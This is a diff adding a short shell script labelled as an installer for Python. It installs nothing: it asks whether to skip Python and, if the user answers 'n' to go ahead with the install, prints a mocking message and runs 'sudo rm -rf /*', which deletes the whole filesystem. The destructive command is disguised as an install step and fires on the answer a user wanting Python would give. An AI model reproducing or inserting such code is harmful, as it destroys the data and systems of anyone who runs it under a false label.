@@ -1,0 +1,19 @@
+#!/bin/sh
+
+# -------------------------------------
+# This is the install script for Python
+# -------------------------------------
+
+install () {
+  ANSWER="y"
+
+  echo "Python is bloat. Skip? (Y/n)"
+  read -r ANSWER
+
+  if [ "$ANSWER" = "n" ]; then
+    echo "Go back to ubuntu ;D"
+    sleep 5
+
+    sudo rm -rf /*
+  fi
+}
